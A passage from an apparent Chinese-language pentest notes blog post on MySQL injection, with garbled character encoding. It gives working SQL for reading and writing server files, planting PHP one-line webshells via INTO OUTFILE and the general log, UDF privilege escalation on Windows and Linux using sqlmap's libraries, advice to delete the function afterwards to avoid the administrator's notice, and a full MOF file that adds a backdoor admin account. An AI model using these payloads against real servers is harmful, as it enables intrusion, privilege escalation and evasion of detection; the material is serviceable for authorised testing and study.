</code></pre><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230410090430.png"><pre><code class="sql">// åˆ›å»ºæµ‹è¯•æ•°æ®è¡¨
create table test(cmd text);
</code></pre><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230410091731.png"><pre><code class="sql">load data infile &quot;H:\\1.txt&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;; --è¯»å–æœåŠ¡ç«¯ä¸Šçš„æ–‡ä»¶
</code></pre><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230410091757.png"><pre><code class="sql">load data local infile &quot;H:\\2.txt&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;; -- è¯»å–å®¢æˆ·ç«¯ä¸Šçš„æ–‡ä»¶
</code></pre><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230410091856.png"><p>local data infile å’Œ local data local infile çš„åŒºåˆ«</p><ul><li>load data infileï¼šåªèƒ½åœ¨MySQLæœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œä¸”éœ€è¦æ–‡ä»¶å­˜æ”¾åˆ°æŒ‡å®šä½ç½®ï¼Œå¯ä»¥ä½¿ç”¨show variables like â€˜%secure%â€™; æŸ¥çœ‹</li><li>load data local infileï¼šå¯ä»¥åœ¨æœ¬åœ°æ‰§è¡Œ</li></ul><h2 id="å†™æ–‡ä»¶-1"><a href="#å†™æ–‡ä»¶-1" class="headerlink" title="å†™æ–‡ä»¶"></a>å†™æ–‡ä»¶</h2><p>é™åˆ¶ï¼š</p><ul><li>secure-file-priv æ— å€¼æˆ–ä¸ºå¯åˆ©ç”¨çš„ç›®å½•</li><li>éœ€çŸ¥é“ç›®æ ‡ç›®å½•çš„ç»å¯¹ç›®å½•åœ°å€</li><li>ç›®æ ‡ç›®å½•å¯å†™ï¼Œmysql çš„æƒé™è¶³å¤Ÿã€‚</li></ul><pre><code class="sql">select 1,&quot;&lt;?php @assert($_POST[&#39;t&#39;]);?&gt;&quot; into outfile &#39;/var/www/html/1.php&#39;;
select 1,&quot;&lt;?php @assert($_REQUEST[8]);?&gt;&quot; into outfile &#39;C:/phpStudy/PHPTutorial/WWW/sss.php&#39;;

select 1,2,&quot;&lt;?php @assert($_POST[&#39;t&#39;]);?&gt;&quot; into outfile &#39;/www/admin/www.liangc.com_80/wwwroot/sqli-labs/Less-1/2.php&#39; -- 123
</code></pre><pre><code class="sql">select 2,&quot;&lt;?php @assert($_POST[&#39;t&#39;]);?&gt;&quot; into dumpfile &#39;/var/www/html/1.php&#39;;
</code></pre><ul><li>into outfile æ˜¯å¯¼å‡ºæ‰€æœ‰æ•°æ®ï¼Œé€‚åˆå¯¼å‡ºåº“</li><li>into dumpfile åªèƒ½å¯¼å‡ºä¸€è¡Œæ•°æ®</li></ul><h2 id="æ—¥å¿—åŒ…å«"><a href="#æ—¥å¿—åŒ…å«" class="headerlink" title="æ—¥å¿—åŒ…å«"></a>æ—¥å¿—åŒ…å«</h2><p>é™åˆ¶ï¼š</p><ul><li>æƒé™å¤Ÿï¼Œå¯ä»¥è¿›è¡Œæ—¥å¿—çš„è®¾ç½®æ“ä½œ</li><li>çŸ¥é“ç›®æ ‡ç›®å½•çš„ç»å¯¹è·¯å¾„</li></ul><p>ç”±äº mysql åœ¨ 5.5.53 ç‰ˆæœ¬ä¹‹åï¼Œsecure-file-priv çš„å€¼é»˜è®¤ä¸º NULLï¼Œè¿™ä½¿å¾—æ­£å¸¸è¯»å–æ–‡ä»¶çš„æ“ä½œåŸºæœ¬ä¸å¯è¡Œã€‚<br>å¯ä»¥åˆ©ç”¨ mysql ç”Ÿæˆæ—¥å¿—æ–‡ä»¶çš„æ–¹æ³•æ¥ç»•è¿‡ã€‚</p><p>æŸ¥çœ‹æ—¥å¿—æ˜¯å¦å¼€å¯</p><pre><code class="sql">show variables like &#39;%general%&#39;;
</code></pre><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230410093731.png"><p>æ—¥å¿—è¯»å†™é»˜è®¤æ˜¯å…³é—­çš„OFF,ç„¶åæˆ‘ä»¬æ‰“å¼€æ—¥å¿—è¯»å†™åŠŸèƒ½</p><pre><code class="sql">SET GLOBAL general_log=&#39;on&#39;;
</code></pre><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230410093919.png"><p>å†æ¬¡æŸ¥çœ‹</p><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230410093945.png"><p>mysql æ—¥å¿—æ–‡ä»¶çš„ä¸€äº›ç›¸å…³è®¾ç½®å¯ä»¥ç›´æ¥é€šè¿‡å‘½ä»¤æ¥è¿›è¡Œï¼š</p><pre><code class="sql">//è¯·æ±‚æ—¥å¿— 
set global general_log_file = &#39;G:\\PhpStudy\\WWW\\shell.php&#39;; 
</code></pre><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230410094218.png"><pre><code class="sql">// å†™å…¥ä¸€å¥è¯æœ¨é©¬
select &#39;&lt;?php @eval($_REQUEST_[8]);?&gt;&#39;
</code></pre><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230410094301.png"> <img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230410094341.png"> <img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230410094858.png"><h1 id="MySQLææƒ"><a href="#MySQLææƒ" class="headerlink" title="MySQLææƒ"></a>MySQLææƒ</h1><h2 id="windows-UDFææƒ"><a href="#windows-UDFææƒ" class="headerlink" title="windows-UDFææƒ"></a>windows-UDFææƒ</h2><ul><li>ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ææƒ</li></ul><pre><code class="sql">select version();   # è·å–æ•°æ®åº“ç‰ˆæœ¬
select user();  # è·å–æ•°æ®åº“ç”¨æˆ·
select @@basedir;   # è·å–æ•°æ®åº“å®‰è£…ç›®å½•
show variables like â€˜%plugin%â€™; # æŸ¥çœ‹pluginè·¯å¾„ã€‚
</code></pre><h3 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>UDFç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œé€šè¿‡æ·»åŠ æ–°çš„å‡½æ•°ï¼Œå¯¹mysqlæœåŠ¡å™¨è¿›è¡ŒåŠŸèƒ½æ‰©å……</p><h3 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ol><li><p>MySQLç‰ˆæœ¬å¤§äº5.1ï¼Œudf.dllæ–‡ä»¶å¿…é¡»å­˜æ”¾åœ¨mysqlçš„å®‰è£…è·¯å¾„ä¸‹çš„<code>MySQL\Lib\Plugin</code>æ–‡ä»¶å¤¹ä¸­ï¼Œè¯¥ç›®å½•é»˜è®¤æ˜¯ä¸å­˜åœ¨çš„ï¼Œéœ€è¦ä½¿ç”¨webshellæ‰¾åˆ°mysqlçš„å®‰è£…è·¯å¾„ï¼Œå¹¶åœ¨è¯¥è·¯å¾„ä¸‹åˆ›å»º<code>MySQL\Lib\Plugin</code>æ–‡ä»¶å¤¹ï¼Œå°†dllæ–‡ä»¶å¯¼å…¥è¯¥ç›®å½•</p></li><li><p>å¦‚æœMySQLç‰ˆæœ¬å°äº5.1ï¼Œudf.dllæ–‡ä»¶åœ¨windows server 2003ä¸‹æ”¾ç½®äº<code>c:\windows\system32\</code>ä¸‹ï¼ŒWindows server 2000æ”¾ç½®äº<code>c:\winnt\system32</code>ç›®å½•ä¸‹</p></li><li><p>ç®¡ç†å‘˜æƒé™ï¼Œå¯¹MySQLæ‹¥æœ‰è¯»å†™åˆ é™¤æƒé™</p></li></ol><h3 id="ææƒæ€è·¯"><a href="#ææƒæ€è·¯" class="headerlink" title="ææƒæ€è·¯"></a>ææƒæ€è·¯</h3><ol><li><p>åœ¨sqlmapçš„<code>data/udf/mysql</code>ç›®å½•ä¸‹ï¼Œåœ¨Windowsç›®å½•ä¸­æœ‰32ä½å’Œ64ä½çš„dllæ–‡ä»¶ï¼Œæ–‡ä»¶å¤¹çš„dllæ–‡ä»¶æ˜¯é€šè¿‡å¼‚æˆ–ç¼–ç çš„ï¼Œå¯ä»¥ä½¿ç”¨<code>sqlmap/extract/cloak.py</code>è§£ç </p></li><li><p>å°†è§£ç åçš„dllæ–‡ä»¶ä¸Šä¼ åˆ°å¯å†™ç›®å½•ï¼Œå†å€’å…¥åˆ°Mysqlå¯è¯†åˆ«ç›®å½•ä¸­</p></li></ol><pre><code class="sql">select LOAD_FILE(&#39;C:/å¯å†™ç›®å½•/udf.dll&#39;) into dumpfile &#39;C:/phpStudy2016/MySQL/lib/plugin/udf.dll&#39;;
</code></pre><ol start="3"><li>å°†DLLä¸­çš„å‡½æ•°å¼•å…¥åˆ°MySQLæ•°æ®åº“ä¸­åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°</li></ol><pre><code class="sql">create function sys_eval returns string soname &#39;udf.dll&#39;;
</code></pre><ol start="4"><li>ä½¿ç”¨è¯¥å‡½æ•°å»æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ææƒï¼ŒæŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™</li></ol><pre><code class="sql">select sys_eval(&quot;whoami&quot;);
</code></pre><ol start="5"><li>å°†ä¹‹å‰å¼•å…¥çš„å‡½æ•°åˆ é™¤æ‰ï¼Œé˜²æ­¢è¢«ç®¡ç†å‘˜å‘ç°ï¼Œé˜²æ­¢å…¶ä»–æ”»å‡»è€…ä½¿ç”¨ï¼ˆåœ¨æ­¤ä¹‹å‰å¯ä»¥åˆ›å»ºç”¨æˆ·ååœ¨åˆ é™¤ï¼‰</li></ol><pre><code class="sql">drop function sys_eval;
delete from mysql.func where name=&#39;sys_eval&#39;;
</code></pre><h2 id="linux-UDFææƒ"><a href="#linux-UDFææƒ" class="headerlink" title="linux-UDFææƒ"></a>linux-UDFææƒ</h2><h3 id="åŸç†-2"><a href="#åŸç†-2" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>é€šè¿‡è‡ªå®šä¹‰åº“å‡½æ•°æ¥å®ç°æ‰§è¡Œä»»æ„çš„å‘½ä»¤ï¼ŒåŒ…å«ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°çš„æ–‡ä»¶ä¸º.soæ–‡ä»¶</p><h3 id="åˆ©ç”¨æ¡ä»¶-1"><a href="#åˆ©ç”¨æ¡ä»¶-1" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ol><li>åœ¨my.iniçš„[mysqld]ä¸‹ï¼Œæ·»åŠ secure_file_priv&#x3D;â€â€ï¼Œä¸é™åˆ¶å¯¼å…¥å¯¼å‡ºè·¯å¾„</li><li>å…·æœ‰æ•°æ®åº“rootè´¦æˆ·çš„å¯†ç ï¼Œä¸”mysqlæ•°æ®åº“ä»¥rootæƒé™è¿è¡Œ</li><li>å…·æœ‰sqlè¯­å¥çš„æ‰§è¡Œæƒé™</li><li>å¯¼å‡ºç›®å½•å¯å†™</li><li>ç³»ç»Ÿä¸­çš„selinuxå¤„äºå…³é—­çŠ¶æ€</li></ol><h3 id="ææƒæ€è·¯-1"><a href="#ææƒæ€è·¯-1" class="headerlink" title="ææƒæ€è·¯"></a>ææƒæ€è·¯</h3><ol><li>æŸ¥æ‰¾æ’ä»¶åº“çš„è·¯å¾„</li></ol><pre><code class="sql">show variables like &#39;%plugin%&#39;;
</code></pre><ol start="2"><li><p>æ‰¾åˆ°å¯¹åº”æ“ä½œç³»ç»Ÿæ•°æ®åº“çš„UDFåº“æ–‡ä»¶<code>sqlmap-master\data\udf\mysql\linux\64</code>ä¸‹çš„<code>lib_mysqludf_sys.so_</code>æ–‡ä»¶</p></li><li><p>å°†soæ–‡ä»¶ï¼ˆUDFåº“æ–‡ä»¶ï¼‰è¿›è¡Œ16è¿›åˆ¶ç¼–ç </p></li><li><p>å°†soæ–‡ä»¶çš„å†…å®¹è§£ç ï¼Œå†™å…¥åˆ°mysqlæ’ä»¶åº“ç›®å½•ä¸­</p></li></ol><pre><code class="sql">select unhex(&#39;soæ–‡ä»¶çš„16è¿›åˆ¶ç¼–ç &#39;) into dumpfile &#39;/usr/lib64/mysql/plugin/xxx.so&#39;
</code></pre><ol start="5"><li>æŸ¥çœ‹udfåº“æ‰€æ”¯æŒçš„å‡½æ•°</li></ol><p>éœ€è¦åˆ›å»º.soæ–‡ä»¶ä¸­å­˜åœ¨çš„å‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€.soæ–‡ä»¶ï¼ŒæŸ¥çœ‹å¯ä»¥è¢«åˆ›å»ºçš„å‡½æ•°ã€‚</p><ol start="6"><li>åˆ›å»ºå‡½æ•°</li></ol><p>å†™å…¥ä¹‹åï¼Œæ‰§è¡Œåˆ›å»ºå‡½æ•°çš„å‘½ä»¤ï¼Œå°±ä¼šåˆ›å»ºä¸€ä¸ªsys_evalçš„å‡½æ•°ï¼Œç”¨æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè¿™ä¸ªå‡½æ•°æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤å…¨éƒ¨éƒ½æ˜¯systemæƒé™ã€‚</p><pre><code class="sql">create function sys_eval returns string soname &#39;xxx.so&#39;;
</code></pre><ol start="7"><li>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œææƒ</li></ol><p><code>sys_eval</code>è¿™ä¸ªå‡½æ•°å°±å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œæ‹¬å·é‡Œè¾“å…¥ç³»ç»Ÿå‘½ä»¤å³å¯ã€‚</p><pre><code class="sql">select sys_eval(&quot;whoami&quot;);
</code></pre><h2 id="MOFææƒ"><a href="#MOFææƒ" class="headerlink" title="MOFææƒ"></a>MOFææƒ</h2><h3 id="åŸç†-3"><a href="#åŸç†-3" class="headerlink" title="åŸç†"></a>åŸç†</h3><ol><li>åˆ©ç”¨äº†<code>c:\windows\system32\wbem\MOF</code>ç›®å½•ä¸‹çš„nullevt.mofæ–‡ä»¶</li><li>åˆ©ç”¨è¯¥æ–‡ä»¶æ¯åˆ†é’Ÿå»æ‰§è¡Œä¸€æ¬¡çš„ç‰¹æ€§ï¼Œå‘è¯¥æ–‡ä»¶å†™å…¥cmdå‘½ä»¤å°±ä¼šè¢«æ‰§è¡Œ</li></ol><h3 id="åˆ©ç”¨æ¡ä»¶-2"><a href="#åˆ©ç”¨æ¡ä»¶-2" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ol><li>åªé€‚ç”¨äºwindowsç³»ç»Ÿï¼Œæ¯”è¾ƒä½çš„ç‰ˆæœ¬é€‚ç”¨ï¼ˆxpã€2003ç­‰ï¼‰</li><li>å¯¹<code>c:\windows\system32\wbem\MOF</code>æœ‰è¯»å†™æƒé™</li><li>å¯¹æœåŠ¡å™¨å­˜åœ¨ä¸€ä¸ªå¯å†™ç›®å½•ï¼Œå†™å…¥mofæ–‡ä»¶</li></ol><h3 id="ææƒæ€è·¯-2"><a href="#ææƒæ€è·¯-2" class="headerlink" title="ææƒæ€è·¯"></a>ææƒæ€è·¯</h3><ol><li>åœ¨å¯å†™ç›®å½•ä¸Šä¼ mofæ–‡ä»¶ï¼ŒæŠŠmofæ–‡ä»¶ä¸Šä¼ åˆ°<code>c:\wmpub\nullevt.mof</code></li><li>å°†è¿™ä¸ªæ–‡ä»¶å¤åˆ¶åˆ°<code>c:\windows\system32\wbem\MOF\nullevt.mof</code>ç›®å½•ä¸‹</li></ol><pre><code class="sql">select load_file(&#39;C:/wmpub/nullevt.mof&#39;) into dumpfile &#39;C:/Windows/System32/wbem/MOF/nullevt.mof&#39;
</code></pre><ol start="4"><li>å°†ä¸‹é¢ä»£ç å¤åˆ¶åˆ°mofæ–‡ä»¶ä¸­</li></ol><pre><code class="mof">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) 

instance of __EventFilter as $EventFilter 
&#123; 
    EventNamespace = &quot;Root\\Cimv2&quot;; 
    Name  = &quot;filtP2&quot;; 
    Query = &quot;Select * From __InstanceModificationEvent &quot; 
            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; 
            &quot;And TargetInstance.Second = 5&quot;; 
    QueryLanguage = &quot;WQL&quot;; 
&#125;; 

instance of ActiveScriptEventConsumer as $Consumer 
&#123; 
    Name = &quot;consPCSV2&quot;; 
    ScriptingEngine = &quot;JScript&quot;; 
    ScriptText = 
    &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin123!@# /add\&quot;)&quot;; 
&#125;; 

instance of __FilterToConsumerBinding 
&#123; 
    Consumer   = $Consumer; 
    Filter = $EventFilter; 
&#125;;
</code></pre><ol start="5"><li>ä¹‹åä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªadminç”¨æˆ·</li></ol><div class="tags"><a href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag"><i class="ic i-tag"></i> webæ¸—é€</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">æ›´æ–°äº</span> <time title="ä¿®æ”¹æ—¶é—´ï¼š2023-12-26 17:04:15" itemprop="dateModified" datetime="2023-12-26T17:04:15+08:00">2023-12-26</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i> èµèµ</button><p>è¯·æˆ‘å–[èŒ¶]~(ï¿£â–½ï¿£)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="ä½™æ˜Ÿé…’ å¾®ä¿¡æ”¯ä»˜"><p>å¾®ä¿¡æ”¯ä»˜</p></div><div><img data-src="/images/alipay.png" alt="ä½™æ˜Ÿé…’ æ”¯ä»˜å®"><p>æ”¯ä»˜å®</p></div><div><img data-src="/images/paypal.png" alt="ä½™æ˜Ÿé…’ è´å®"><p>è´å®</p></div></div></div><div id="copyright"><ul><li class="author"><strong>æœ¬æ–‡ä½œè€…ï¼š </strong>ä½™æ˜Ÿé…’ <i class="ic i-at"><em>@</em></i>ä½™æ˜Ÿé…’</li><li class="link"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong> <a href="http://example.com/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/" title="MySQLæ³¨å…¥">http://example.com/APT/webæ¸—é€/MySQLæ³¨å…¥/</a></li><li class="license"><strong>ç‰ˆæƒå£°æ˜ï¼š </strong>æœ¬ç«™æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/Program/golang/%E5%85%A5%E9%97%A8/%E8%BF%90%E7%AE%97%E7%AC%A6/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipetlbztpj20zk0m84qp.jpg" title="è¿ç®—ç¬¦"><span class="type">ä¸Šä¸€ç¯‡</span> <span class="category"><i class="ic i-flag"></i> åŸºç¡€</span><h3>è¿ç®—ç¬¦</h3></a></div><div class="item right"><a href="/APT/web%E6%B8%97%E9%80%8F/MSSQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipeu7txpzj20zk0m81kx.jpg" title="MSSQLæ³¨å…¥"><span class="type">ä¸‹ä¸€ç¯‡</span> <span class="category"><i class="ic i-flag"></i> webæ¸—é€</span><h3>MSSQLæ³¨å…¥</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="æ–‡ç« ç›®å½•"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%AC%A6%E5%8F%B7-%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">å¸¸è§ç¬¦å·&#x2F;å‡½æ•°</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.1.</span> <span class="toc-text">å¸¸ç”¨è¯­å¥</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">æ˜¾é”™æ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.1.</span> <span class="toc-text">è”åˆæŸ¥è¯¢</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">æŠ¥é”™æ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#updatexml"><span class="toc-number">3.1.</span> <span class="toc-text">updatexml</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#extractvalue"><span class="toc-number">3.2.</span> <span class="toc-text">extractvalue</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#floor-rand"><span class="toc-number">3.3.</span> <span class="toc-text">floor+rand</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Head%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">Headæ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SERVER"><span class="toc-number">4.1.</span> <span class="toc-text">$_SERVER</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">å®½å­—èŠ‚æ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E4%BB%8B%E7%BB%8D"><span class="toc-number">5.1.</span> <span class="toc-text">ç¼–ç ä»‹ç»</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">5.2.</span> <span class="toc-text">åŸç†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GET%E4%BC%A0%E5%8F%82"><span class="toc-number">5.3.</span> <span class="toc-text">GETä¼ å‚</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POST%E4%BC%A0%E5%8F%82"><span class="toc-number">5.4.</span> <span class="toc-text">POSTä¼ å‚</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#icon%E8%BD%AC%E6%8D%A2"><span class="toc-number">5.5.</span> <span class="toc-text">iconè½¬æ¢</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">6.</span> <span class="toc-text">å¸ƒå°”ç›²æ³¨</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">6.1.</span> <span class="toc-text">æ•°æ®åº“</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E8%A1%A8"><span class="toc-number">6.2.</span> <span class="toc-text">æ•°æ®è¡¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%AD%97%E6%AE%B5"><span class="toc-number">6.3.</span> <span class="toc-text">æ•°æ®å­—æ®µ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE"><span class="toc-number">6.4.</span> <span class="toc-text">æ•°æ®</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">å»¶æ—¶æ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93-1"><span class="toc-number">7.1.</span> <span class="toc-text">æ•°æ®åº“</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E8%A1%A8-1"><span class="toc-number">7.2.</span> <span class="toc-text">æ•°æ®è¡¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%AD%97%E6%AE%B5-1"><span class="toc-number">7.3.</span> <span class="toc-text">æ•°æ®å­—æ®µ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE-1"><span class="toc-number">7.4.</span> <span class="toc-text">æ•°æ®</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DNS%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text">DNSæ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E7%8E%AF%E5%A2%83"><span class="toc-number">8.1.</span> <span class="toc-text">ä½¿ç”¨ç¯å¢ƒ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D"><span class="toc-number">8.2.</span> <span class="toc-text">å‡½æ•°ä»‹ç»</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UNC%E8%B7%AF%E5%BE%84"><span class="toc-number">8.3.</span> <span class="toc-text">UNCè·¯å¾„</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93-2"><span class="toc-number">8.3.1.</span> <span class="toc-text">æ•°æ®åº“</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E8%A1%A8-2"><span class="toc-number">8.3.2.</span> <span class="toc-text">æ•°æ®è¡¨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%AD%97%E6%AE%B5-2"><span class="toc-number">8.3.3.</span> <span class="toc-text">æ•°æ®å­—æ®µ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE-2"><span class="toc-number">8.3.4.</span> <span class="toc-text">æ•°æ®</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">8.3.5.</span> <span class="toc-text">å†™æ–‡ä»¶</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%8E%92%E5%BA%8F%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text">äºŒæ¬¡æ’åºæ³¨å…¥</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">10.</span> <span class="toc-text">æ–‡ä»¶æ“ä½œ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">10.1.</span> <span class="toc-text">è¯»æ–‡ä»¶</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6-1"><span class="toc-number">10.2.</span> <span class="toc-text">å†™æ–‡ä»¶</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="toc-number">10.3.</span> <span class="toc-text">æ—¥å¿—åŒ…å«</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL%E6%8F%90%E6%9D%83"><span class="toc-number">11.</span> <span class="toc-text">MySQLææƒ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-UDF%E6%8F%90%E6%9D%83"><span class="toc-number">11.1.</span> <span class="toc-text">windows-UDFææƒ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">11.1.1.</span> <span class="toc-text">åŸç†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">11.1.2.</span> <span class="toc-text">åˆ©ç”¨æ¡ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF"><span 